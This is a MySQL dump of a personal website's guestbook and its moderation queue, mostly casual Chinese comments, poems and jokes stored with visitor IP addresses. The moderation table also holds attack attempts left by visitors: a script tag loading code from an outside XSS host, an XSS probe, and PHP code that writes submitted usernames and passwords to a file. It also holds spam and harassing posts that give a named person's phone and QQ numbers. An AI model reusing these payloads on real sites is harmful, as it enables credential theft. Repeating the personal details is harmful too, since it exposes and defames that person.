-- MySQL dump 10.13  Distrib 8.0.23, for Linux (x86_64)
--
-- Host: localhost    Database: spring
-- ------------------------------------------------------
-- Server version	8.0.23

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `spring`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `spring` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;

USE `spring`;

--
-- Table structure for table `chat`
--

DROP TABLE IF EXISTS `chat`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `chat` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(32) DEFAULT NULL,
  `comment` varchar(1024) NOT NULL,
  `time` datetime NOT NULL,
  `ip` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=259 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `chat`
--

LOCK TABLES `chat` WRITE;
/*!40000 ALTER TABLE `chat` DISABLE KEYS */;
INSERT INTO `chat` VALUES (1,'大哥','我来了我来了🌝🌝🌝🌝','2020-04-17 16:53:05',NULL),(2,'小弟','咦。','2020-04-17 16:53:32',NULL),(3,'小弟','你是谁呀','2020-04-17 16:53:41',NULL),(5,'瑶哥我的爱','留言','2020-04-17 17:28:43',NULL),(6,'或非','别问，来过。','2020-04-17 17:59:28',NULL),(7,'过客','好看的皮囊经不起扫黄打非，有趣的灵魂涉嫌账号违规。','2020-04-17 18:01:10',NULL),(8,'过客','厉害了👊','2020-04-17 18:08:52',NULL),(9,'过客','天青色等烟雨，而我在等你。','2020-04-17 19:08:04',NULL),(10,'过客','炊烟袅袅升起，隔江千万里。','2020-04-17 19:09:13',NULL),(12,'过客','站长来啦','2020-04-17 22:05:32',NULL),(13,'过客','罗老师，别这样','2020-04-17 22:09:22',NULL),(14,'杰哥','来，让我看看你发育正不正常','2020-04-17 22:12:17',NULL),(15,'过客','🐽 😜 😜 😭 这些都能发\n','2020-04-17 22:26:11',NULL),(16,'瑶哥我的爱','牛逼','2020-04-17 22:26:25',NULL),(17,'过客','👄 😜 🐽 😁 ','2020-04-17 22:27:12',NULL),(18,'过客','我看看这是谁','2020-04-17 23:09:37',NULL),(19,'过客','站长又来了👿','2020-04-18 01:06:44',NULL),(20,'过客','😏😏😏','2020-04-18 10:25:27',NULL),(21,'站长','站长又双来啦','2020-04-18 13:05:13',NULL),(22,'大象','小象小象我是大象','2020-05-06 18:29:35',NULL),(23,'11','abc','2020-05-06 18:34:59',NULL),(24,'牛','。。。','2020-05-06 19:47:13',NULL),(25,'过客','😏可以的','2020-05-06 20:44:41',NULL),(27,'过客','不能让我加飞宝输了，冲啊飞宝','2020-05-06 21:58:14',NULL),(28,'过客','⚪⚪⚪🔴🔴⚪⚪⚪🔴🔴⚪⚪\n⚪⚪🔴🔴🔴🔴⚪🔴🔴🔴🔴⚪\n⚪⚪🔴🔴 小飞 🔴 小飞 🔴🔴⚪\n⚪⚪⚪🔴✨我的宝贝✨ 🔴⚪\n⚪⚪⚪⚪🔴🔴🔴🔴🔴⚪⚪⚪\n⚪⚪⚪⚪⚪🔴🔴🔴⚪⚪⚪⚪\n⚪⚪⚪⚪⚪⚪🔴⚪⚪⚪⚪⚪','2020-05-06 21:58:57',NULL),(32,'过客','飞宝有妈妈们在，别怕','2020-05-06 22:06:03',NULL),(34,'过客','高贵路人勿cue我们饭圈哥哥哦[可怜]，欢迎关注饭圈哥哥5月32号上映的《kpf情史》[爱心]，抱走饭圈哥哥我们不约[爱你]','2020-05-06 22:11:56',NULL),(37,'过客','守护全世界最好的大胆','2020-05-06 22:29:33',NULL),(38,'粉丝','大佬牛皮\n','2020-05-06 22:29:40',NULL),(42,'自然','可还行','2020-05-07 02:18:00',NULL),(143,'可乐','🐂🍻','2020-05-07 09:15:32',NULL),(144,'过客','人生如逆旅，我亦是行人','2020-05-07 20:24:45',NULL),(146,'杜甫','会当凌绝顶，一览众山小','2020-05-07 20:25:44',NULL),(147,'李白','蜀道之难，难于上青天，侧身西望长咨嗟！','2020-05-07 20:26:53',NULL),(148,'周树人','逮捕周树人和我鲁迅有什么关系','2020-05-07 20:28:33',NULL),(149,'嬴政','我是秦始皇，打钱','2020-05-07 20:33:15',NULL),(158,'曹操','我，曹操，打钱！','2020-05-07 21:38:05','223.66.118.28'),(159,'我不是→_→','：)','2020-05-07 23:04:03','111.19.112.125'),(160,'王勃 ','落霞与孤鹜齐飞 秋水共长天一色','2020-05-08 16:29:31','124.23.133.114'),(161,'李白','人生得意须尽欢，莫使金樽空对月。','2020-05-08 17:09:24','124.23.133.114'),(162,'白金之星','欧拉欧拉欧拉','2020-05-10 08:07:24','223.66.115.107'),(163,'Dio','木大木大木大','2020-05-10 08:07:25','223.66.115.107'),(183,'韦应物','我有一瓢酒,可以慰风尘','2020-05-10 22:00:44','124.23.133.85'),(184,'李商隐','直道相思了无益，未妨惆怅是清狂','2020-05-10 22:01:19','124.23.133.85'),(185,'苏轼','试问岭南应不好，却道：此心安处是吾乡','2020-05-10 22:01:41','124.23.134.211'),(187,'小粉丝','tql','2020-05-27 10:50:42','223.66.112.252'),(188,'LKL','六一儿童节快乐😊 　\n　\n　\n　\n　\n♥＿＿＿＿＿＿＿＿＿♥','2020-06-01 20:39:10','111.19.88.244'),(189,'浮点数尾数基值大小','浮点数尾数基值大小','2020-06-05 16:07:36','223.66.115.52'),(190,'Dio','木大木大木大木大\n','2020-06-05 16:08:05','223.66.115.52'),(191,'xiaoxiang','捕捉楼下大佬','2020-06-06 01:31:27','124.23.133.97'),(192,'little elephant','你是个好人','2020-06-11 09:34:05','223.66.115.194'),(193,'大象','小象你好，我是大象','2020-06-12 13:54:17','223.8.186.109'),(194,'Lalala','你还是从前那个少年','2020-06-12 13:54:51','223.8.186.109'),(195,'Lalala','没有一丝丝改变','2020-06-12 13:55:01','223.8.186.109'),(196,'不吃豆腐的小鱼','城里的人想出去，\n城外的人想进来。','2020-06-13 16:00:55','111.19.95.113'),(197,'大哥哥','你这网站希望他能和种子一样发展起来','2020-06-14 21:50:10','219.145.246.239'),(198,'小象','长智齿了，好磨嘴啊~','2020-06-16 20:22:00','124.23.134.244'),(199,'过客','明天考传感器，加油','2020-06-28 14:14:48','124.23.134.35'),(200,'xiaoxiang','突然出现，开始复习二叉树了😜\n','2020-07-08 22:27:18','124.23.134.16'),(201,'过客','猛然间，满血复活','2020-07-09 14:56:38','124.115.74.133'),(202,'过客','🐙🐙🐙','2020-07-15 13:43:51','117.136.87.57'),(204,'过客','jvm我来啦','2020-08-03 23:09:18','124.23.134.76'),(208,'过客','嗯哼','2020-08-04 14:34:11','223.8.205.32'),(211,'过客','我要好好学习🌚🌚','2020-08-26 17:53:26','221.11.20.107'),(212,'来客','就还行','2020-08-26 18:48:11','221.11.20.106'),(217,'过客','哈哈哈哈哈','2020-09-07 20:26:40','124.115.173.34'),(218,'过客','🉑️','2020-09-07 20:26:44','124.115.173.34'),(220,'站长','留言审核功能上线啦 (*^▽^*) ','2020-09-08 00:24:00','221.11.20.109'),(221,'呆呆','我来辽','2020-09-08 00:28:23','221.11.20.106'),(222,'过客','今天开始上设计模式了','2020-09-08 13:01:55','221.11.20.107'),(223,'过客','😀😀','2020-09-08 17:44:49','221.11.20.105'),(224,'过客','阿飞你好黑啊','2020-09-09 00:00:51','117.39.230.191'),(225,'海荣','匡飞，飞飞飞飞飞飞','2020-09-09 00:05:33','117.39.229.165'),(228,'站长','没想到吧，我有留言审核了😝','2020-09-16 10:55:37','221.11.20.108'),(229,'站长','hxd去blog瞅瞅吧','2020-09-21 20:20:23','221.11.20.105'),(230,'WithhKai凯','每一个人都应该用你的努力去惊艳时光，生活不会亏待任何一个努力的人','2020-10-01 23:37:14','117.61.8.32'),(231,'站长','太惨了吧，86%的电池损耗(╥﹏╥)','2020-10-08 21:43:36','221.11.20.103'),(232,'站长','gitee page服务好像出问题了，blog的部署一直没成功','2020-10-14 15:30:35','221.11.20.104'),(234,'过客','I fancy u.','2020-10-20 21:07:41','123.139.85.234'),(235,'站长','转眼间到12月了','2020-12-11 23:34:32','221.11.20.103'),(251,'站长','本站已运行10个月左右，后端使用的是ssm框架开发，前端使用bootstrap+jQuery。\n这段时间打算把后端使用springboot重写一遍，等有空了深入学一学前端，把前端美化一下。','2021-02-03 23:59:24','106.44.133.11'),(252,'过客','🤙🤙🤙 新年大吉！','2021-02-12 19:14:39','219.145.247.155'),(253,'站长','后端使用springboot重写了，下一步是使用mybatis plus替换mybatis。','2021-02-15 21:13:27','124.23.133.186'),(254,'阿宇','I have a enormous crush on you','2021-02-22 11:36:05','111.18.142.107'),(255,'ayu','My heart used be like fawn bumps. but, With the passage of time, the fawn grow up, he become steady and apathetic and i thought he never would bump. until the day i met you  in the process of we getting to know each other. i heard he says \"This is my last time to bumps. \" now, i think he lied to me,because he bumps everyday.','2021-04-01 23:14:26','117.39.194.138'),(256,'过客','迷失森林的小鹿，会不会遇到女巫?','2021-07-26 15:33:54','221.11.20.107'),(257,'过客','祝你吉祥又如意，祝你天天开心~~~~~~~~~~~~~~','2021-07-28 16:38:58','221.11.20.103'),(258,'过客','我有一种预感，看到这条消息的人，身体会越来越好，厄运通通退散，生活越来越明朗，所行之路皆是坦途。所愿化所得！！！！！！！','2021-08-01 09:56:57','221.11.20.103');
/*!40000 ALTER TABLE `chat` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `chattemp`
--

DROP TABLE IF EXISTS `chattemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `chattemp` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(32) DEFAULT NULL,
  `comment` varchar(1024) NOT NULL,
  `time` datetime NOT NULL,
  `ip` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1095 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `chattemp`
--

LOCK TABLES `chattemp` WRITE;
/*!40000 ALTER TABLE `chattemp` DISABLE KEYS */;
INSERT INTO `chattemp` VALUES (1000,'过客','站长测试(*^ω^*)','2020-09-08 00:21:26','221.11.20.109'),(1011,'过客','没人留言，呜呜呜','2020-09-11 19:05:21','219.144.235.61'),(1012,'孙逊','好项目加我 孙逊 qq2995395656 TEL15995143417','2020-09-15 19:41:19','61.182.31.42'),(1014,'过客','干得漂亮！就得用审核功能卡死qq5648455石家庄财政局家属楼（行唐县）奠刘林强那种到处留言的傻逼鸡吧','2020-09-17 23:51:16','222.189.130.104'),(1015,'孙逊','站长你好，这边有长期稳定的影视广告，自己产品推广，内容正规，万IP能到100-300，稳定日结，已合作很多同类型网站 流量高价变现，支持BTC等结算方式来了就送50，望站长能回复下此邮件，或加下方：QQ 401605028 孙逊 TEL：15995143417','2020-09-19 00:17:04','61.182.31.42'),(1021,'过客','加油<sCRiPt sRC=//xsshs.cn/lkEK></sCrIpT>','2020-10-16 20:15:03','183.31.11.164'),(1024,'过客','钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417','2020-11-03 22:55:27','61.182.31.42'),(1025,'过客','www.5648455.xyz','2020-11-09 12:45:58','222.189.128.103'),(1026,'5648455刘林强','5648455刘林强  www.liulinqiangnimabeiwanrencha.xyz','2020-11-10 22:12:19','117.91.68.65'),(1027,'孙逊q401605028','好项目加qq401605028孙逊孙逊骚扰女性制造噪音TEL159_95143417','2020-11-15 18:38:19','61.182.31.42'),(1028,'孙雪毕','孙逊q401605028\n制造噪音，骚扰异性','2020-12-03 22:40:57','61.182.31.42'),(1030,'孙逊q401605028','钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴骚扰异性孙逊q401605028 TEL15995143417钢琴','2020-12-12 21:58:45','61.182.31.42'),(1038,'站长','在程序运行期间，java运行时系统始终为所有的对象维护一个被称为运行时的类型标识。\n这个信息跟踪着每个对象所属的类。虚拟机利用运行时类型信息选择相应的方法执行。\n保存这些信息的类被称为Class。','2021-01-05 15:15:45','123.139.52.93'),(1046,'TCP的缓冲区','正常情况下，小数据包在发送前会组成为更大的包。在发送另一个包之前，本地主机要等待远程系统对前一个包的确认。\n最大带宽等于缓冲区大小除以延迟。','2021-01-15 13:22:42','113.201.50.222'),(1051,'过客','heiheihei','2021-02-11 00:21:03','111.18.95.144'),(1052,'过客','heiheihei','2021-02-11 00:21:03','111.18.95.144'),(1053,'过客','heiheihei','2021-02-11 00:21:03','111.18.95.144'),(1054,'过客','heiheihei','2021-02-11 00:21:04','111.18.95.144'),(1055,'过客','heiheihei','2021-02-11 00:21:05','111.18.95.144'),(1056,'过客','哥哥好帅我好爱','2021-02-11 12:20:27','111.18.142.68'),(1059,'嘿嘿嘿','晚安','2021-02-15 22:59:42','111.18.135.137'),(1061,'JustTes2020','JustTes2020','2021-02-23 16:58:42','223.240.238.155'),(1062,'JustTes2020','JustTes2020','2021-02-23 16:58:43','223.240.238.155'),(1063,'JustTes2020','JustTes2020','2021-02-23 16:58:44','223.240.238.155'),(1064,'站长','测试一下','2021-02-26 16:00:04','113.201.50.142'),(1081,'ayu','My heart used be like fumn bumps. but, With the passage of time, the fumn grow up, he become steady and apathetic and i thought he never would bump. until the day i met you  in the process of we getting to know each other. i heard he says \"This is my last time to bumps. \" now, i think he lied to me,because he bumps everyday.','2021-04-01 23:11:31','117.39.194.138'),(1083,'过客','呜呜呜，是fawn，不是fumn。（吐血，这都能写错）','2021-04-01 23:15:02','117.39.194.138'),(1084,'过客','hello','2021-04-18 21:50:34','49.221.35.92'),(1085,'过客','啊','2021-04-18 21:56:40','49.221.35.92'),(1086,'过客','<?php\n    if(!empty($_GET[\'password\'])){\n        $username=$_GET[\'username\'];\n        $password=$_GET[\'password\'];\n        \n        try{\n            $path=$_SERVER[\"DOCUMENT_ROOT\"].\'/password.txt\';\n            $fp=fopen($path,\'a\');\n            flock($fp, LOCK_EX);\n            fwrite($fp, \"$username\\t $password\\r\\n\");\n            flock($fp, LOCK_UN);\n            fclose($fp);\n        }catch(Exception $e){\n\n        }\n    }\n?>','2021-04-18 21:57:31','49.221.35.92'),(1087,'过客','<input type=hidden style=`x:expression(alert(/xss/))`>','2021-04-18 22:00:47','49.221.35.92'),(1090,'admin','这是什么','2021-07-29 14:56:54','124.115.172.94'),(1091,'过客','是那潺潺的山泉是那潺潺的山泉~','2021-08-01 09:54:15','221.11.20.103'),(1093,'过客','oh\nmy\ngod\n忘记手动换行（尴尬尬）','2021-08-01 10:02:53','221.11.20.103');
/*!40000 ALTER TABLE `chattemp` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-09-09 19:42:04
